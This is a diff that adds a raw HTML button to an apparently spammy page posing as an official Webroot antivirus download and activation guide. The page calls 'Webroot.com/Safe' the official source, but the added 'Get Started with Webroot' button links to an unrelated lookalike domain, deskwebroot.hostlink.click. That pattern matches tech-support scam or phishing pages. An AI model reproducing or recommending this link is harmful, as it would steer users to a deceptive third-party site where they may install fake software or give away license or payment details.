@@ -3,6 +3,11 @@ Webroot.com/Safe Resource – Download, Install, and Secure Your System
 
 If you're setting up Webroot antivirus protection for your PC, Mac, or mobile device, then navigating to **Webroot.com/Safe** is the very first step you need to take. The **Webroot.com/Safe** portal is the official resource for downloading and installing Webroot SecureAnywhere products. Whether you're a new user or reinstalling your software, using **Webroot.com/Safe** ensures you get the right files directly from the source. 
 
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
 For anyone asking, "Where can I download and activate my Webroot license?" — the answer is simple: go to **Webroot.com/Safe** and follow the steps outlined in this complete guide. This post will walk you through the process of accessing `webroot.com/safedownloadinstall`, setting up the program on your system, and activating your license for optimal protection.
 
 What is Webroot.com/Safe?
